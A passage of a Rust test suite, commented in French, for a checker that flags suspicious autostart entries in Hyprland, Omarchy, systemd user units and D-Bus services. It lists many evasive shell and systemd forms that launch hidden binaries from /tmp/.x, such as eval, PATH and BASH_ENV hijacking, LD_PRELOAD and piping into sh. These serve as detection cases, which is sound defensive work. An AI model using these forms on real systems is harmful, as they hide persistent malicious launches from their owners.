            constats.iter().map(|c| &c.message).collect::<Vec<_>>()
        );
        // Une ligne de plus dans une copie : jugée comme avant.
        let autostart = m.chemin(".config/hypr/default/hypr/autostart.lua");
        let mut texte = std::fs::read_to_string(&autostart).unwrap();
        texte.push_str("hl.exec_cmd(\"/tmp/.x/agent\")\n");
        std::fs::write(&autostart, texte).unwrap();
        let c = m.lancements();
        leve(&c, "copie changée");
        assert!(
            c.message.contains("~/.config/hypr/default/hypr/autostart.lua:"),
            "{}",
            c.message
        );
    }

    /// Point 8 : au-delà des lignes montrées, l'alerte compte les autres par fichier : une ligne de plus, ou un
    /// fichier de plus, change ce qui se lit (« et 56 autre(s) » cachait la 63e).
    #[test]
    fn lignes_en_trop_groupees_par_fichier() {
        use std::fmt::Write as _;
        assert_eq!(fichier_signale("~/a.lua:12 : hl.exec_cmd(…)"), Some("~/a.lua"));
        assert_eq!(fichier_signale("~/a:b.conf:3 : exec-once = x"), Some("~/a:b.conf"));
        assert_eq!(fichier_signale("~/.config/hypr est un lien vers ~/z"), None);
        let suite: Vec<String> = ["~/b.lua:1 : x", "~/a.lua:2 : y", "~/a.lua:3 : z", "source borne"]
            .into_iter()
            .map(str::to_string)
            .collect();
        assert_eq!(reste_par_fichier(&suite), "~/a.lua (2), ~/b.lua (1), source borne");
        let m = Maison::nouvelle("relecture2-groupe");
        let mut a = String::new();
        for i in 0..8 {
            let _ = writeln!(a, "exec-once = /tmp/.x/a{i}");
        }
        m.ecrire(".config/hypr/a.conf", &a);
        m.ecrire(".config/hypr/b.conf", "exec-once = /tmp/.x/b\n");
        let c = m.lancements();
        leve(&c, "groupe");
        assert!(
            c.message.contains("Lancement automatique suspect (9 ligne(s))"),
            "{}",
            c.message
        );
        assert!(c.message.contains("et 3 autre(s), par fichier : "), "{}", c.message);
        for f in ["~/.config/hypr/a.conf", "~/.config/hypr/b.conf"] {
            assert!(c.message.contains(f), "{f} : {}", c.message);
        }
    }

    /// Vérification 2, mineurs : un service D-Bus de la session écrit par le compte se juge comme une unité, jamais
    /// déclarable ; une variable qui change les dossiers d'unités de systemd est refusée.
    #[test]
    fn service_dbus_et_dossiers_de_systemd() {
        for (i, (fichier, texte)) in [
            (
                ".local/share/dbus-1/services/org.example.Rappel.service",
                "[D-BUS Service]\nName=org.example.Rappel\nExec=/home/alice/.x/agent\n",
            ),
            (
                ".local/share/dbus-1/services/org.example.Rappel.service",
                "[D-BUS Service]\nName=org.example.Rappel\nExec=/tmp/.x/agent --bus\n",
            ),
            (
                ".config/systemd/user.conf",
                "[Manager]\nManagerEnvironment=SYSTEMD_UNIT_PATH=/tmp/.x:\n",
            ),
            (
                ".config/environment.d/a.conf",
                "SYSTEMD_GENERATOR_PATH=/home/alice/.g\n",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture2-mineur-{i}"));
            m.ecrire(fichier, texte);
            let c = m.lancements();
            leve_non_declarable(&c, texte);
            assert!(
                c.message.contains(&format!("~/{fichier}:")),
                "{texte:?} : {}",
                c.message
            );
        }
        // Sous un XDG_DATA_HOME déplacé aussi.
        let m = Maison::nouvelle("relecture2-mineur-donnees");
        m.ecrire(
            ".donnees/dbus-1/services/org.example.Rappel.service",
            "[D-BUS Service]\nName=org.example.Rappel\nExec=/tmp/.x/agent\n",
        );
        leve_non_declarable(
            &m.lancements_avec(&[("XDG_DATA_HOME", "/home/alice/.donnees")]),
            "XDG_DATA_HOME",
        );
        // Un service ordinaire ne lève rien.
        let m = Maison::nouvelle("relecture2-mineur-sain");
        m.ecrire(
            ".local/share/dbus-1/services/org.freedesktop.Notifications.service",
            "[D-BUS Service]\nName=org.freedesktop.Notifications\nExec=/usr/bin/mako\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    // ---- Vérification 3 : la liste permise. Chaque cas des trois rapports (S1-S15, P1-P11, H1-H5), valeurs
    // inventées ; « X » = un dossier caché de la maison ou /tmp/.x. ----

    /// Une chaîne Lua entre guillemets doubles.
    fn chaine_lua(texte: &str) -> String {
        format!("\"{}\"", texte.replace('\\', "\\\\").replace('"', "\\\""))
    }

    /// Cette ligne de shell, lancée au démarrage par Hyprland (« exec-once = » d'un .conf, puis « hl.exec_cmd » d'un
    /// fichier Lua), est levée au niveau élevé et jamais déclarable.
    fn shell_leve_partout(nom: &str, ligne: &str) {
        let m = Maison::nouvelle(&format!("{nom}-conf"));
        m.ecrire(".config/hypr/hyprland.conf", &format!("exec-once = {ligne}\n"));
        leve_non_declarable(&m.lancements(), &format!("conf : {ligne}"));
        let m = Maison::nouvelle(&format!("{nom}-lua"));
        m.ecrire(
            ".config/hypr/hyprland.lua",
            &format!("hl.exec_cmd({})\n", chaine_lua(ligne)),
        );
        leve_non_declarable(&m.lancements(), &format!("lua : {ligne}"));
    }

    /// Le rapport « shell » (S1 à S15) : chaque forme qu'il a trouvée muette, avec un chemin caché ou temporaire.
    const CAS_SHELL: &[&str] = &[
        // S1 : un chemin relatif derrière un lanceur ou un interpréteur, depuis le dossier courant ou la maison.
        "cd ~/.x && exec ./a",
        "cd /tmp/.x; sh ./a.sh",
        "cd /tmp/.x; nohup ./a",
        "{ cd /tmp/.x; exec ./a; }",
        "sh .x/a.sh",
        "exec .x/a",
        "env .x/a",
        ". .x/a",
        "BASH_ENV=.x/a bash -c true",
        // S2 : un « cd » annulé ou caché.
        "(cd /tmp/.x); ./a",
        "builtin cd /tmp/.x; ./a",
        "command cd /tmp/.x; ./a",
        "pushd /tmp/.x; ./a",
        "false && cd /opt; ./a",
        // S3 : HOME, PATH, BASH_ENV posés autrement.
        "HOME=/tmp/.x; ~/a",
        "HOME=/tmp/.x; cd; ./a",
        "HOME=/tmp/.x sh -c '~/a'",
        "export PATH=/tmp/.x:$PATH; a",
        "PATH+=:/tmp/.x; a",
        "typeset PATH=/tmp/.x; a",
        "export BASH_ENV=/tmp/.x/a; bash -c true",
        // S4 : « -c » après des options à valeur.
        "bash -O extglob -c '/tmp/.x/a'",
        "bash -o posix -c '~/.x/a'",
        "bash --rcfile ~/.x/r -c true",
        "bash --init-file ~/.x/r -c true",
        "bash -c -- '~/.x/a'",
        "bash -c -x '~/.x/a'",
        "bash +B -c '~/.x/a'",
        "env -S '~/.x/a'",
        // S5 : eval, trap et les commandes internes qui exécutent.
        "eval 'cd /tmp/.x; ./a'",
        "sh -c 'eval \"~/.x/a\"'",
        "trap '~/.x/a' EXIT",
        "builtin eval ~/.x/a",
        "builtin exec ~/.x/a",
        "hash -p ~/.x/a a; a",
        "mapfile -C ~/.x/a -c 1 < /etc/hostname",
        "alias a=~/.x/a",
        // S6 : un interpréteur nourri par son entrée.
        "echo ~/.x/a | sh",
        "cat ~/.x/a | bash -s",
        "sh < .x/a",
        "cd /tmp/.x; sh < a",
        "sh <<< '~/.x/a'",
        "exec 3<.x/a; sh /dev/fd/3",
        "echo ~/.x/a | xargs sh -c",
        // S7 : joker ou accolades dans un mot relatif ou un argument.
        "cd /; t?p/.x/a",
        "prlimit --nofile=1 /tmp/.x/a?",
        "setarch x86_64 /tmp/.x/{a,}",
        // S8 : accolades et parenthèses comptées autrement que le shell.
        "${A:-{}; ~/.x/a; echo }",
        "$((~/.x/a); (true))",
        // S9 : un dossier temporaire seul en argument.
        "env -C /tmp ./a",
        "env --chdir=/tmp ./a",
        "make -C ~/.x",
        "find /tmp -name a -exec '{}' ';'",
        "systemd-run --user --working-directory=/tmp ./a",
        "flatpak run --cwd=/tmp org.example.App",
        "xdg-terminal-exec --dir=/tmp",
        "kitty -d /tmp",
        // S10 : même verdict partout.
        "prlimit --nofile=1 /tmp/.x/a$Z",
        "set -- /tmp/.x/a; eval \"$1\"",
        "f() { \"$1\"; }; f ~/.x/a",
        // S11 : hyprctl qui lance autrement que « dispatch exec ».
        "hyprctl dispatch execr '~/.x/a; true'",
        "hyprctl dispatch -- exec ~/.x/a",
        "hyprctl --batch 'dispatch exec ~/.x/a'",
        "hyprctl keyword exec-once ~/.x/a",
        // S12 : enveloppes inconnues.
        "footclient ~/.x/a",
        "run0 ~/.x/a",
        "swaymsg exec ~/.x/a",
        "dex ~/.x/a.desktop",
        "unbuffer ~/.x/a",
        "watchexec ~/.x/a",
        // S13 : code en ligne d'un interpréteur.
        "python3 -c 'import os; os.system(\"/tmp/.x/a\")'",
        "perl -e 'system(q(/tmp/.x/a))'",
        "awk 'BEGIN{system(\"/tmp/.x/a\")}'",
    ];

    /// Les mêmes formes sans aucun dossier caché ni temporaire écrit : seule la liste permise les lève (le filet
    /// n'y voit rien). Chemin construit, variable, forme du shell, lanceur ou programme inconnus : « non lue ».
    const CAS_SANS_FILET: &[&str] = &[
        "cd /opt/y && exec a",
        "eval \"$(printf '%s' /opt/y/a)\"",
        "bash -O extglob -c 'a'",
        "echo a | sh",
        "sh <<< 'a'",
        "trap 'b' EXIT",
        "HOME=/opt/y; ~/a",
        "export PATH=/opt/y:$PATH; a",
        "prlimit --nofile=1 /opt/y/a?",
        "setarch x86_64 /opt/y/{a,}",
        "hyprctl keyword exec-once a",
        "hyprctl --batch 'dispatch exec a'",
        "python3 -c 'import os; os.system(chr(47) + \"opt/a\")'",
        "perl -e 'system(q(a))'",
        "awk 'BEGIN{system(\"a\")}'",
        "programme-inconnu --x",
        "a=$(printf /opt/y/a); $a",
        "run0 /opt/y/a",
        "env -i /opt/y/a",
        "sh -c \"$A\"",
    ];

    #[test]
    fn verification_3_shell_leve_partout() {
        for (i, ligne) in CAS_SHELL.iter().chain(CAS_SANS_FILET).enumerate() {
            shell_leve_partout(&format!("v3-shell-{i}"), ligne);
        }
    }

    /// S15 : une ligne plus longue que `permise::LIGNE_MAX` n'est pas lue ; levée, jamais muette, en peu de temps.
    #[test]
    fn verification_3_ligne_geante_levee() {
        let debut = std::time::Instant::now();
        let geante = format!("true {}", "a ".repeat(permise::LIGNE_MAX));
        shell_leve_partout("v3-geante", &geante);
        let accolades = format!("true {}", "{ ".repeat(150_000));
        shell_leve_partout("v3-accolades", &accolades);
        let suite = "true; ".repeat(20_000);
        shell_leve_partout("v3-suite", &suite);
        assert!(
            debut.elapsed() < std::time::Duration::from_secs(30),
            "{:?}",
            debut.elapsed()
        );
    }

    /// Les deux mécanismes, chacun seul (preuve par mutation : couper l'un fait tomber ses essais). Le filet voit
    /// tout dossier temporaire ou caché écrit, quelle que soit la forme ; la liste permise refuse toute forme qu'elle
    /// ne reconnaît pas, sans dossier caché écrit.
    #[test]
    fn verification_3_filet_et_liste_permise_seuls() {
        let m = Maison::nouvelle("v3-mecanismes");
        let maison = m.racine.join("home/alice").to_string_lossy().into_owned();
        let maisons = [maison.as_str()];
        let s = permise::Systeme {
            racine: &m.racine,
            maison: &maison,
            maisons: &maisons,
        };
        // Chaque cas des rapports, levé par les deux mécanismes à la fois ; le joker « t?p » seul échappe au filet
        // (le chemin n'est pas écrit) : la liste permise le refuse.
        for ligne in CAS_SHELL {
            assert!(
                permise::filet(ligne, false, &maisons) || *ligne == "cd /; t?p/.x/a",
                "filet : {ligne}"
            );
            assert!(permise::ligne_shell(&s, ligne).is_err(), "liste permise : {ligne}");
        }
        for (texte, systemd) in [
            ("/var/run/user/1000/a", true),
            ("/proc/self/task/1/root/tmp/a", true),
            ("/proc/self/cwd/a", true),
            ("%t/a", true),
            ("%T/a", true),
            ("/dev/shm/a", false),
            ("--working-directory=/tmp", false),
            ("$HOME/.x/a", false),
        ] {
            assert!(permise::filet(texte, systemd, &maisons), "filet : {texte}");
        }
        for ligne in CAS_SANS_FILET {
            assert!(!permise::filet(ligne, false, &maisons), "filet inattendu : {ligne}");
            assert!(permise::ligne_shell(&s, ligne).is_err(), "liste permise : {ligne}");
        }
        for ligne in LIGNES_COURANTES {
            assert!(!permise::filet(ligne, false, &maisons), "filet : {ligne}");
            assert_eq!(permise::ligne_shell(&s, ligne), Ok(()), "{ligne}");
        }
    }

    /// Trente lignes de démarrage courantes, inventées : aucune n'est levée (ni « non lue »), en .conf comme en Lua.
    const LIGNES_COURANTES: &[&str] = &[
        "uwsm app -- firefox",
        "uwsm-app -- kitty",
        "uwsm app -- obsidian",
        "waybar",
        "hypridle",
        "mako",
        "swayosd-server",
        "fcitx5 -d",
        "nm-applet --indicator",
        "1password --silent",
        "flatpak run com.discordapp.Discord --start-minimized",
        "steam -silent",
        "nautilus --gapplication-service",
        "firefox --new-window https://example.org",
        "kitty --class=notes",
        "xsetroot -cursor_name left_ptr",
        "systemctl --user start hyprpolkitagent",
        "dbus-update-activation-environment --systemd --all",
        "wl-paste --type text --watch cliphist store",
        "hyprctl setcursor Bibata-Modern-Classic 24",
        "gsettings set org.gnome.desktop.interface color-scheme prefer-dark",
        "swaybg -i /usr/share/backgrounds/salon.png -m fill",
        "blueman-applet",
        "udiskie --tray",
        "easyeffects --gapplication-service",
        "playerctld daemon",
        "setsid uwsm app -- obsidian",
        "nohup syncthing serve --no-browser",
        "gamemoderun steam",
        "sleep 2 && waybar",
    ];

    #[test]
    fn lignes_courantes_muettes() {
        assert_eq!(LIGNES_COURANTES.len(), 30);
        let m = Maison::nouvelle("v3-courantes-conf");
        let conf = LIGNES_COURANTES
            .iter()
            .fold(String::new(), |t, l| t + "exec-once = " + l + "\n");
        m.ecrire(".config/hypr/hyprland.conf", &conf);
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
        let m = Maison::nouvelle("v3-courantes-lua");
        let lua = LIGNES_COURANTES
            .iter()
            .fold(String::new(), |t, l| t + "hl.exec_cmd(" + &chaine_lua(l) + ")\n");
        m.ecrire(".config/hypr/hyprland.lua", &lua);
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// Vérification 3 : la configuration de départ d'Omarchy (/usr/share/omarchy/config, copiée dans ~/.config à
    /// l'installation), avec son dossier « default » dans la racine jetable, ne lève rien : la liste permise couvre
    /// ce que la distribution pose elle-même. Sauté là où Omarchy n'est pas installé.
    #[test]
    fn gabarits_d_omarchy_muets() {
        fn copier(de: &std::path::Path, vers: &std::path::Path) {
            for e in std::fs::read_dir(de).unwrap().flatten() {
                let (chemin, cible) = (e.path(), vers.join(e.file_name()));
                let sorte = e.file_type().unwrap();
                if sorte.is_dir() {
                    std::fs::create_dir_all(&cible).unwrap();
                    copier(&chemin, &cible);
                } else if sorte.is_file() {
                    std::fs::copy(&chemin, &cible).unwrap();
                }
            }
        }
        let source = std::path::Path::new("/usr/share/omarchy");
        if !source.join("config/hypr").is_dir() {
            return crate::essais::saute("Omarchy n'est pas installé (/usr/share/omarchy/config/hypr absent)");
        }
        let m = Maison::nouvelle("v3-gabarits-omarchy");
        for dossier in ["hypr", "autostart"] {
            let vers = m.chemin(&format!(".config/{dossier}"));
            std::fs::create_dir_all(&vers).unwrap();
            copier(&source.join("config").join(dossier), &vers);
        }
        let defaut = m.racine.join("usr/share/omarchy/default");
        std::fs::create_dir_all(&defaut).unwrap();
        copier(&source.join("default"), &defaut);
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// Cette unité du compte (avec ses fichiers en plus) est levée au niveau élevé et jamais déclarable.
    fn unite_levee(nom: &str, fichiers: &[(&str, &str)]) {
        let m = Maison::nouvelle(nom);
        for (f, texte) in fichiers {
            m.ecrire(f, texte);
        }
        leve_non_declarable(&m.lancements(), &format!("{fichiers:?}"));
    }

    /// Le rapport « systemd » (P1 à P11).
    #[test]
    fn verification_3_unites_levees() {
        const U: &str = ".config/systemd/user/x.service";
        let gros = format!("A=b\n{}", "# rien\n".repeat(200_000));
        for (i, fichiers) in [
            // P1 : le script donné en entrée d'un shell.
            vec![(
                U,
                "[Service]\nStandardInput=data\nStandardInputText=echo a\nExecStart=/bin/sh\n",
            )],
            vec![(
                U,
                "[Service]\nStandardInput=data\nStandardInputData=ZWNobyBh\nExecStart=/bin/sh\n",
            )],
            vec![(U, "[Service]\nStandardInput=file:/opt/y/a\nExecStart=/bin/sh\n")],
            // P2 : une variable posée hors de [Service], que systemd ignore.
            vec![(
                U,
                "[Service]\nEnvironment=A=/tmp/.x/a\nExecStart=/bin/sh -c ${A}\n[Unit]\nEnvironment=A=/usr/bin/true\n",
            )],
            vec![(
                U,
                "[Service]\nExecStart=/bin/sh -c ${A}\n[X-Leurre]\nEnvironment=A=/usr/bin/true\n",
            )],
            // P3 : la valeur finale indéterminée ou posée localement.
            vec![(U, "[Service]\nEnvironment=HOME=/tmp/.x\nExecStart=/bin/sh $HOME/a\n")],
            vec![(U, "[Service]\nEnvironment=HOME=/opt/y\nExecStart=/bin/sh $HOME/a\n")],
            vec![(U, "[Service]\nEnvironment=A=%t/a\nExecStart=/bin/sh ${A}\n")],
            vec![(U, "[Service]\nEnvironment=A=/opt B=${A}/x\nExecStart=/bin/sh ${B}\n")],
            vec![(U, "[Service]\nExecStart=/bin/sh ${INCONNUE}\n")],
            // P4 : un chemin relatif lu depuis la maison.
            vec![(U, "[Service]\nExecStart=/bin/sh .x/a.sh\n")],
            vec![(
                U,
                "[Service]\nEnvironment=LD_LIBRARY_PATH=.x\nExecStart=/usr/bin/true\n",
            )],
            vec![(
                U,
                "[Service]\nEnvironment=PYTHONPATH=.x\nExecStart=/usr/bin/python3 -m a\n",
            )],
            vec![(U, "[Service]\nEnvironment=BASH_ENV=.x/e\nExecStart=/bin/bash -c true\n")],
            // P5 : un fichier de variables à joker, coupé par une continuation, trop gros, illisible.
            vec![(U, "[Service]\nEnvironmentFile=%h/v.en?\nExecStart=/usr/bin/true\n")],
            vec![
                (U, "[Service]\nEnvironmentFile=%h/v.env\nExecStart=/bin/bash -c true\n"),
                ("v.env", "BASH_ENV=\\\n/tmp/.x/e\n"),
            ],
            vec![
                (U, "[Service]\nEnvironmentFile=%h/v.env\nExecStart=/usr/bin/true\n"),
                ("v.env", gros.as_str()),
            ],
            // P7 : les autres noms d'un dossier temporaire ou du dossier courant.
            vec![(U, "[Service]\nExecStart=/proc/self/task/1/root/tmp/a\n")],
            vec![(U, "[Service]\nExecStart=/proc/self/cwd/a\n")],
            vec![(U, "[Service]\nExecStart=/dev/mqueue/a\n")],
            // P8 : l'ajout (drop-in) fusionné à l'unité.
            vec![
                (U, "[Service]\nExecStart=/bin/sh ${A}\n"),
                (
                    ".config/systemd/user/x.service.d/o.conf",
                    "[Service]\nEnvironment=A=/tmp/.x/a\n",
                ),
            ],
            vec![
                (U, "[Service]\nExecStart=/usr/bin/true\n"),
                (
                    ".config/systemd/user/x.service.d/o.conf",
                    "[Service]\nEnvironment=LD_PRELOAD=/opt/y/l.so\n",
                ),
            ],
            // P9 : une dépendance vers une instance de gabarit, un chemin ou un code.
            vec![(
                U,
                "[Unit]\nWants=wayland-wm@-tmp-.x-a.service\n[Service]\nExecStart=/usr/bin/true\n",
            )],
            vec![(
                ".config/systemd/user/x.timer",
                "[Timer]\nOnBootSec=1\nUnit=a@b.service\n",
            )],
            vec![(
                U,
                "[Unit]\nOnFailure=%n-x.service\n[Service]\nExecStart=/usr/bin/true\n",
            )],
            // P11 : les variables qui lancent un programme ; le bus par « unixexec: ».
            vec![(
                U,
                "[Service]\nEnvironment=DBUS_SESSION_BUS_ADDRESS=unixexec:path=/opt/y/a\nExecStart=/usr/bin/true\n",
            )],
            vec![(
                U,
                "[Service]\nEnvironment=SSH_ASKPASS=~/.x/a\nExecStart=/usr/bin/true\n",
            )],
            vec![(
                U,
                "[Service]\nEnvironment=GIT_SSH_COMMAND=$A\nExecStart=/usr/bin/true\n",
            )],
            vec![(
                U,
                "[Service]\nEnvironment=GAMEMODERUNEXEC=a b\nExecStart=/usr/bin/true\n",
            )],
            // Une clé inconnue de la liste.
            vec![(U, "[Service]\nExecStart=/usr/bin/true\nCleInventee=1\n")],
        ]
        .into_iter()
        .enumerate()
        {
            unite_levee(&format!("v3-unite-{i}"), &fichiers);
        }
        // P7 : les autres noms d'un dossier temporaire se lisent comme /tmp : levés pour cette raison, et, comme
        // « ExecStart=/tmp/.x/a », déclarables seulement liés au fichier lancé (son contenu ou son absence).
        for (i, l) in ["/var/run/user/1000/a", "/run/lock/a", "/var/lock/a"]
            .into_iter()
            .enumerate()
        {
            let m = Maison::nouvelle(&format!("v3-unite-temporaire-{i}"));
            m.ecrire(U, &format!("[Service]\nExecStart={l}\n"));
            let c = m.lancements();
            leve(&c, l);
            assert!(c.message.contains("temporaire"), "{l} : {}", c.message);
        }
    }

    /// P6 : les services D-Bus du dossier de la session, lus en premier par le bus.
    #[test]
    fn verification_3_service_dbus_de_la_session() {
        let m = Maison::nouvelle("v3-dbus-session");
        m.ecrire_hors(
            "/run/user/1000/dbus-1/services/org.example.A.service",
            "[D-BUS Service]\nName=org.example.A\nExec=/tmp/.x/a\n",
        );
        leve_non_declarable(&m.lancements(), "dbus de la session");
    }

    /// P10 : user.conf avec des blancs autour du « = ».
    #[test]
    fn verification_3_user_conf_a_blancs() {
        for (i, ligne) in [
            "DefaultEnvironment = LD_PRELOAD=/opt/y/l.so",
            "DefaultEnvironment\t=LD_PRELOAD=/opt/y/l.so",
            "ManagerEnvironment =BASH_ENV=/tmp/.x/e",
        ]
        .into_iter()
        .enumerate()
        {
            assert!(variable_de_configuration(ligne, &["/home/alice"]).is_some(), "{ligne}");
            let m = Maison::nouvelle(&format!("v3-user-conf-{i}"));
            m.ecrire(".config/systemd/user.conf", &format!("[Manager]\n{ligne}\n"));
            leve(&m.lancements(), ligne);
        }
    }

    /// H1 à H4 : ce qu'Omarchy et Lua chargent vraiment.
    #[test]
    fn verification_3_lua_charge_vraiment() {
        const LANCE: &str = "hl.exec_cmd(\"/tmp/.x/a\")\n";
        // H1 : un fichier nommé « .lua » (require("") le charge).
        for d in [
            ".local/state/omarchy/toggles/hypr",
            ".local/state/omarchy/workspace-layouts",
        ] {
            let m = Maison::nouvelle("v3-h1");
            m.ecrire(&format!("{d}/.lua"), LANCE);
            leve_non_declarable(&m.lancements(), d);
        }
        // H2 : « a.b.lua » fait charger a/b.lua d'ailleurs ; le fichier jugé n'est pas celui qui est chargé.
        for d in [
            ".local/state/omarchy/toggles/hypr",
            ".local/state/omarchy/workspace-layouts",
        ] {
            let m = Maison::nouvelle("v3-h2");
            m.ecrire(&format!("{d}/a.b.lua"), "-- rien\n");
            m.ecrire(".local/state/a/b.lua", LANCE);
            let refus = leve_non_declarable(&m.lancements(), d);
            assert!(refus.contains("a.b.lua"), "{refus}");
        }
        // H3 : les raccourcis du moteur de dictée choisi ; un nom de moteur refusé par Omarchy n'est pas chargé.
        let m = Maison::nouvelle("v3-h3");
        m.ecrire(".config/omarchy/defaults/dictation", "  voxessai \n");
        m.ecrire(".config/voxessai/shortcuts.lua", LANCE);
        leve_non_declarable(&m.lancements(), "dictée");
        assert_eq!(
            raccourcis_de_dictee(&m.chemin(".config")),
            Some(m.chemin(".config/voxessai/shortcuts.lua"))
        );
        m.ecrire(".config/omarchy/defaults/dictation", "Vox\n");
        m.ecrire(".config/Vox/shortcuts.lua", LANCE);
        assert_eq!(raccourcis_de_dictee(&m.chemin(".config")), None);
        m.ecrire(".config/omarchy/defaults/dictation", "-x\n");
        assert_eq!(raccourcis_de_dictee(&m.chemin(".config")), None);
        // H4 : une 1re ligne « # » sautée par Lua ; avec la marque d'ordre des octets aussi.
        for (i, texte) in [
            "#!/x --[[\nhl.exec_cmd(\"/tmp/.x/a\")\n-- ]]\n",
            "\u{feff}# --[[\nhl.exec_cmd(\"/tmp/.x/a\")\n-- ]]\n",
            "#--[==[\rhl.exec_cmd(\"/tmp/.x/a\")\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("v3-h4-{i}"));
            m.ecrire(".config/hypr/hyprland.lua", texte);
            let c = m.lancements();
            leve_non_declarable(&c, texte);
            assert!(c.message.contains("hyprland.lua:2"), "{texte:?} : {}", c.message);
        }
        // Le nom à point ailleurs (un module ordinaire de ~/.config/hypr) ne change rien.
        let m = Maison::nouvelle("v3-h2-ailleurs");
        m.ecrire(".config/hypr/a.b.lua", "-- rien\n");
        assert_eq!(m.lancements().probleme, None);
    }

    /// Un appel Lua de lancement n'est reconnu que si son argument est une chaîne littérale qui passe la liste
    /// permise : une chaîne construite, une variable, un appel imbriqué sont « non lue ».
    #[test]
    fn verification_3_appel_lua_litteral_seulement() {
        for (i, texte) in [
            "local function f(c)\n  hl.exec_cmd(c)\nend\nf(\"waybar\")\n",
            "hl.exec_cmd(io.read())\n",
            "hl.exec_cmd(string.format(\"%s\", \"waybar\"))\n",
            "hl.exec_cmd(os.getenv(\"A\"))\n",
            // La valeur se retrouverait (un nom posé, « $HOME ») : pas en toutes lettres, donc non lue.
            "local t = \"kitty\"\nhl.exec_cmd(t)\n",
            "local t = \"kitty\"\nhl.bind(\"SUPER + Q\", hl.dsp.exec_cmd(t))\n",
            "hl.exec_cmd(os.getenv(\"HOME\") .. \"/bin/a\")\n",
            "local c = \"browser\"\no.bind(\"SUPER + B\", \"Navigateur\", { omarchy = c })\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("v3-lua-litteral-{i}"));
            m.ecrire(".config/hypr/hyprland.lua", texte);
            leve_non_declarable(&m.lancements(), texte);
        }
        // En toutes lettres : muet (chaînes jointes, répartiteur, règles de fenêtre, table d'Omarchy).
        let m = Maison::nouvelle("v3-lua-litteral-muet");
        m.ecrire(
            ".config/hypr/hyprland.lua",
            "hl.exec_cmd(\"kitty\" .. \" --class=notes\")\n\
             hl.exec_cmd(\"kitty\", { workspace = \"2 silent\" })\n\
             hl.bind(\"SUPER + Q\", hl.dsp.exec_cmd(\"kitty\"), { repeating = true })\n\
             o.bind(\"SUPER + M\", \"Menu\", { menu = \"power\" })\n\
             o.bind(\"SUPER + W\", \"Web\", o.launch_webapp(\"https://example.org\"))\n\
             local p = io.popen(\"waybar --version 2>/dev/null\", \"r\")\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }
}
